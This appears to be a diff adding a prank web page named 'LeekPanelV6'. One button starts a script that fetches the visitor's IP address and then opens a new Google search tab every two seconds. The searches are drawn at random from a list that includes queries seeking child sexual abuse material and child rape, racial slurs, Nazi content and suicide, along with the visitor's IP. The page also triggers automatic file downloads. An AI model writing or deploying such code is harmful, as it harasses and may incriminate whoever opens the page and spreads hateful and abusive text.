@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LeekPanelV6</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: black;
+            color: white;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .btn {
+            font-size: 20px;
+            padding: 15px;
+            cursor: pointer;
+            background-color: red;
+            color: white;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>LeekPanelV6</h1>
+    <button class="btn" onclick="startLeekPanel()">Run</button>
+
+    <script>
+        let queries = [
+            "Why am I a loser?",
+            "Is Leek Panel a Trojan?",
+            "How to get rid of Leek Panel?",
+            "Leek Panel malware removal",
+            "Why did I install Leek Panel?",
+            "Leeks",
+            "How to grow leeks",
+            "Leek recipes",
+            "how to be a nazi",
+            "how to rape little girls without being cought",
+            "where to buy weed",
+            "child porn",
+            "where to get child porn",
+            "nigger",
+            "im gonna kill myself",
+            "gay porn",
+            "pornhub",
+            "rule34",
+            "loli porn",
+            "gore sites",
+            "gore",
+            "rapist dick",
+            "black market",
+            "where to buy black people"
+        ];
+        let interval;
+        let downloadInterval;
+
+        function fetchIPAndRun() {
+            fetch("https://api64.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    queries.push(`My IP address: ${data.ip}`);
+                    startOpeningTabs();
+                })
+                .catch(() => {
+                    queries.push("Failed to fetch IP address");
+                    startOpeningTabs();
+                });
+        }
+
+        function startOpeningTabs() {
+            interval = setInterval(() => {
+                let searchQuery = queries[Math.floor(Math.random() * queries.length)];
+                if (searchQuery.includes("leeks")) {
+                    searchLeeks();
+                } else {
+                    window.open(`https://www.google.com/search?q=${encodeURIComponent(searchQuery)}`, "_blank");
+                }
+            }, 2000);
+        }
+
+        function searchLeeks() {
+            // Fetch a random leek image from Unsplash API
+            fetch("https://source.unsplash.com/600x400/?leek")
+                .then(response => {
+                    let imageUrl = response.url; // Get the random image URL
+                    downloadLeekImage(imageUrl); // Start downloading
+                })
+                .catch(error => console.log('Error fetching leek image:', error));
+        }
+
+        function downloadLeekImage(imageUrl) {
+            let a = document.createElement('a');
+            a.href = imageUrl;  // Use the fetched image URL
+            a.download = 'leek_image.jpg';  // Set the download name
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        function startLeekPanel() {
+            fetchIPAndRun();
+        }
+
+        window.addEventListener("beforeunload", () => {
+            clearInterval(interval);
+        });
+    </script>
+
+</body>
+</html>>
